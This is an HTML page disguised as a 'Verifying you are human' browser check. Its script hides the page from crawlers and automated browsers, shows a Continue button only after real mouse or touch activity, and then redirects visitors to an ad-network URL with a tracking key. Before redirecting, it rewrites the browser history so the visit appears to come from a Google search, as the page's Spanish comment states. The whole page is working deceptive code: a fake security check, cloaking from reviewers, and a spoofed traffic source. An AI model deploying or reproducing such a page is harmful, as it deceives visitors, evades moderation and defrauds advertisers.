<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Checking your browser...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="referrer" content="origin" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    #continue-btn {
      display: none;
      padding: 10px 20px;
      font-size: 18px;
      margin-top: 20px;
      background-color: #0f0;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Verifying you are human...</h2>
  <p>Move your mouse, scroll or tap the screen to continue</p>
  <p id="status">Waiting for activity...</p>
  <button id="continue-btn" onclick="redirect()">Continue</button>

  <script>
    const finalURL = "https://www.profitableratecpm.com/m2qmqkqz1?key=4223c6ba65cdbc631d144eacab0bcc2c";
    let isHuman = false;
    let interacted = false;

    const markAsHuman = () => {
      if (!isHuman) {
        isHuman = true;
        document.getElementById("status").innerText = "Verified! You may continue.";
        document.getElementById("continue-btn").style.display = "inline-block";
      }
    };

    const isBot = () => {
      return (
        navigator.webdriver ||
        /bot|crawl|spider|google|facebook|pingdom|preview|fetch/i.test(navigator.userAgent) ||
        !navigator.userAgent ||
        screen.width < 100 || screen.height < 100
      );
    };

    if (isBot()) {
      document.getElementById("status").innerText = "Bot detected. Access denied.";
    } else {
      ['mousemove', 'scroll', 'click', 'touchstart'].forEach(evt => {
        window.addEventListener(evt, () => {
          interacted = true;
          markAsHuman();
        }, { once: true });
      });
    }

    function redirect() {
      // Simular que el visitante viene desde Google
      history.replaceState(null, null, 'https://www.google.com/search?q=free+video');
      window.location.href = finalURL;
    }
  </script>
</body>
</html>
